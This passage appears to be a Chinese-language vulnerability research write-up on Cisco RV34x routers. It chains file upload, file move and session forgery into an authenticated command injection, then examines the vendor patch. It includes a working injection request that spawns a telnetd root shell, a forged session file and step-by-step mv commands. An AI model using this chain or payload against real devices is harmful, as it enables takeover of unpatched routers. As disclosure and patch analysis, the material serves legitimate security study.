    int __fastcall jmaapi_action(int a1, int a2, int a3, int a4, int a5)
    {
      ...
        return mctx_rpc(s, a3, a4, a5);
    }
跟进去`mctx_rpc`函数，可以看到它调用了`maapi_request_action_str_th`函数去向`ConfD`发起请求，执行`rpc`调用。
    int __fastcall mctx_rpc(int *a1, int a2, int a3, int a4)
    {
      ...
      while ( v9 )
      {
        .
        ...
        v5 = maapi_request_action_str_th(sock, thandle, (int)&output, v15, v10);
        ...
          if ( output )
          {
            mctx_rpc_cli((int)a1, (char *)output, a3, a4);
            free(output);
          }
          if ( !json_object_object_length(a4) )
          {
            v16 = json_object_new_int(0);
            json_object_object_add(a4, "code", v16);
            v17 = json_object_new_string("Success");
            json_object_object_add(a4, "errstr", v17);
          }
        }
      }
      StrBufFree(&v27);
      return v5;
    }
`maapi_request_action_str_th`函数的官方手册的说明如下，正是由该函数最终发送`rpc`请求去触发`/usr/bin/update-clients`的，调用的传递的参数要符合`yang`模型中的定义。
    int maapi_request_action_str_th(int sock, int thandle, char **output,
    const char *cmd_fmt, const char *path_fmt, ...);
    /*Does the same thing as maapi_request_action_th(), but takes the parameters as a string and
    returns the result as a string. The library allocates memory for the result string, and the caller is responsible
    for freeing it. This can in all cases be done with code like this:
    */
    char *output = NULL;
    if (maapi_request_action_str_th(sock, th, &output,
     "test reverse listint [ 1 2 3 4 ]", "/path/to/action") == CONFD_OK) {
     ...
     free(output);
    }
跟到这里就算结束了，`ConfD`里面的实现就不继续跟踪了，具体的`ConfD`的说明还是建议简要把官方手册的关键章节看看，对进一步掌握框架由很好的帮助。
值得一提的是因为`ConfD`是`root`权限，所以`/usr/bin/update-clients`最终执行的时候也是`root`权限，因此利用这个漏洞拿到的权限也是`root`，比之前在`cgi`中拿到的权限要高。
认证后命令注入的`post`包如下所示：
    POST /jsonrpc HTTP/1.1
    Host: 127.0.0.1:8080
    Accept: application/json, text/plain, */*
    Content-Length: 350
    Connection: close
    Cookie: selected_language=English; user=cisco; blinking=1; config-modified=1; disable-startup=0; redirect-admin=0; group=admin; attributes=RW; ru=0; bootfail=0; model_info=RV345; fwver=1.0.03.24; session_timeout=false; sessionid=138b633ddd844b81a8ea48a149819f645fbe31fb64a1bd7cc0072f3d14420da0; current-page=WAN_Settings
    {
      "jsonrpc":"2.0",
      "method":"action",
      "params":{
        "rpc":"update-clients",
        "input":{
          "clients": [
            {
              "hostname": "hostname$(/usr/sbin/telnetd -l /bin/sh -p 2306)",
              "mac": "64:d1:a3:4f:be:e1",
              "device-type": "client",
              "os-type": "windows"
            }
          ]
        }
      }
    }
## 漏洞利用
上面一节中把三个漏洞的细节都描述了一遍，本节中我们将尝试将三个漏洞结合起来实现无条件`RCE`的利用。
先回顾下三个漏洞的作用：
  * 任意文件上传漏洞：可以实现上传任意文件到`/tmp/upload`目录中，文件名是可以预测的，是`0000000000`的数字递增；
  * 任意文件移动漏洞：可以实现将文件系统中任意文件移动至`/tmp/www`目录下；
  * 认证后命令执行漏洞：简单粗暴的认证后命令注入。
利用这三个漏洞的结合可以总结为：
  1. 利用任意文件上传漏洞上传伪造的`session`到`/tmp/upload`目录下；
  2. 利用任意文件移动漏洞将伪造的`session`移动至`/tmp`目录下，实现有效`session`的伪造；
  3. 基于有效`session`，利用认证后命令执行漏洞拿到`root`权限；
下面一步一步进行解释。
第一步伪造`session`，先说明下`RV34x`中的`session`构成，`session`存储在`/tmp/websession`目录下
    /tmp # ls websession/
    session  token
    /tmp # cat websession/session
    {
      "max-count":1,
      "cisco":{
        "dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8":{
          "user":"cisco",
          "group":"admin",
          "time":2433831,
          "access":1,
          "timeout":1800,
          "leasetime":13118911
        }
      }
    }
    /tmp # ls websession/token/
    dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8
    /tmp # cat websession/token/dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8
    /tmp #
可以看到整个`session`的构成包含两个部分，一部分是`/tmp/websession/session`文件中包含登录的用户信息，信息中存储了用户名、`session
id`、用户组、超时时间等；另一部分则是`/tmp/websession/token/`目录下有`sessionid`对应的文件，文件内容为空。因此要构造的是`session`文件内容，以及空的`sessionid`所对应的文件。
先利用任意文件漏洞漏洞上传上面两个文件，一个内容如下，另一个内容随意。要提一句的是`session`文件中`time`的构造是系统启动的时间，可以用任意文件移动漏洞执行`mv
/proc/uptime /tmp/www/login.html`，然后访问`login.html`来泄漏时间戳。
    {
      "max-count":1,
      "cisco":{
        "dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8":{
          "user":"cisco",
          "group":"admin",
          "time":2433831,
          "access":1,
          "timeout":1800,
          "leasetime":13118911
        }
      }
    }
还有个问题需要解决的是如何确定传上去的两个文件的名称。这可以通过利用任意文件移动漏洞备份`/tmp/www/index.html`，然后随意上传一个文件，再利用任意文件移动漏洞依次序将`/tmp/upload/0000000000`移动至`/tmp/www/index.html`，访问主页，如果主页内容发生变化，即可得到序号，下一次再将两个文件上传，文件名称即为刚刚得到的序号递增的两个序号。
第二步是利用任意文件移动漏洞将刚刚伪造的`session`及`session
id`文件移动至`/tmp`目录下，实现有效`session`的伪造。前面说过该任意文件移动只能将任意的文件移动到`/tmp/www`目录下，而`websession`文件夹则在`/tmp`目录下，如何才能够通过这个漏洞将我们的文件移动到`/tmp`目录下呢？
解决方法可以利用`/var`这个目录，该目录是`/tmp`目录到链接，将该目录移动至`/tmp/www`目录下，后续再往`/tmp/www/var`目录下去移动文件即可实现将文件移动至`/tmp`目录中。
    /tmp # ls -al / | grep var
    lrwxrwxrwx    1 root     root             4 Oct 22  2021 var -> /tmp
这个过程也要利用一些空的文件夹（`3g-4g-driver out_certs certs firmware
pnp_config`）的移动来实现，具体的操作流程如下所示。第一行是`post`数据包放的内容，第二行是实现的效果。
    # /tmp/websession websession_bak
    mv /tmp/websession /tmp/www/websession_bak
    # /tmp/3g-4g-driver websession
    mv /tmp/3g-4g-driver /tmp/www/websession
    # /tmp/upload/0000000016 session
    mv /tmp/upload/0000000016 /tmp/www/session
    # /tmp/firmware token
    mv /tmp/firmware /tmp/www/token
    # /tmp/upload/0000000017 dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8
    mv /tmp/upload/0000000017 /tmp/www/dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8
    # /tmp/www/dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8 token
    mv /tmp/www/dead00a47a9b1177e259bd84dff3bd50651df76f61c20139e5b86d6d4bafd2e8 /tmp/www/token
    # /tmp/www/token websession
    mv /tmp/www/token /tmp/www/websession
    # /tmp/www/session websession
    mv /tmp/www/session /tmp/www/websession
    # /var tmp
    mv /var /tmp/www/tmp
    # /tmp/www/websession tmp
    mv /tmp/www/websession /tmp/www/tmp
经过上面的两步一后，即可用认证后的代码执行漏洞拿到`root shell`。
## 漏洞补丁
去[官网](https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.26)下载新的固件，`binwalk`解压查看内容，对三个漏洞逐个查看。
任意文件上传漏洞似乎没有修复，`cisco`可能认为它是`nginx`的一个正常功能。
    location /api/operations/ciscosb-file:form-file-upload {
        set $deny 1;
        if ($http_authorization != "") {
            set $deny "0";
        }
        if ($deny = "1") {
            return 403;
        }
        upload_pass /form-file-upload;
        upload_store /tmp/upload;
        upload_store_access user:rw group:rw all:rw;
        upload_set_form_field $upload_field_name.name "$upload_file_name";
        upload_set_form_field $upload_field_name.content_type "$upload_content_type";
        upload_set_form_field $upload_field_name.path "$upload_tmp_path";
        upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
        upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";
        upload_pass_form_field "^.*$";
        upload_cleanup 400 404 499 500-505;
        upload_resumable on;
    }
任意文件移动漏洞的修复没有限制`/form-file-upload`的访问，而是在`upload.cgi`进行了修补。可以看到它在调用`prepare_file`之前会校验源目的地地址，从而修复了任意文件移动漏洞。
      jsonutil_get_string(dword_2348C, &file_path, "\"file.path\"", -1);
      ...
      if ( !file_path || match_regex("^/tmp/upload/[0-9]{10}$", file_path) )
      {
        puts("Content-type: text/html\n");
        printf("Error Input");
        goto LABEL_31;
      }
最后再来看看命令执行漏洞，`update-clients`脚本内容未发生变化，但是`yang`接口定义却有变化。可以看到它限制了`hostname`的类型，同时将`os`等参数去掉了，导致无法形成注入。
        rpc update-clients {
            input {
                list clients {
                    key mac;
                    leaf mac {
                        type yang:mac-address;
                        mandatory true;
                    }
                    leaf hostname {
                        type inet:domain-name;
                    }
                    uses ciscosb-security-common:DEVICE-OS-TYPE;
                }
            }
        }
## 总结
配置文件的缺陷看起来微不足道，经过精心构造却能导致严重的漏洞。三个漏洞很巧妙，能够给人很多的启发。
## 参考
  * [Nginx-upload-module中文文档](https://blog.osf.cn/2020/06/30/nginx-upload-module/)
  * [nginx介绍和常用模块配置](https://www.liuvv.com/p/7245bfc7.html)
  * [ConfD User Guide](https://manuals.plus/wp-content/sideloads/software-tail-f-confd-user-guide-original.pdf)
  * [ConfD Basic学习手记](https://marvinsblog.net/post/2019-09-26-confd-basic/)
* * *